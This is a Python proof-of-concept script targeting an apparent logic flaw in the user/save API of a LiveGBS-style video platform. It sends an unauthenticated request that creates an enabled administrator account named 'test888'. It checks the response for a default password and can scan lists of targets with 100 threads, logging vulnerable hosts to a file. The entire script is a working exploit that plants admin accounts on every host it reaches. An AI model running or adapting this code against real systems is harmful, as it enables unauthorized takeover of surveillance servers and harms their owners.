import requests,argparse,sys
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


def banner():
    banner = """
          <<<<<<<<某iveGBS user/save 逻辑缺陷漏洞>>>>>>>>>>>    
"""
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description='某iveGBS user/save 逻辑缺陷漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='please input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='please input your file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))

        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload = "/api/v1/user/save?ID=&Username=test888&Role=%E7%AE%A1%E7%90%86%E5%91%98&Enable=true"
    url = target+payload
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
    }

    try:
        re = requests.get(url=url,headers=headers,verify=False,timeout=5)
        if re.status_code == 200 and '12345678' in re.text:
            print( f"[+] {target} 存在逻辑缺陷漏洞！")
            with open('success.txt','a',encoding='utf-8')as ft:
                ft.write(target+'\n')
        else:
            print(f'[-]该{target}不存在逻辑缺陷漏洞')
    except Exception as e:
        print(f"[?] 该url出现错误:{target}")


if __name__ == '__main__':
    main()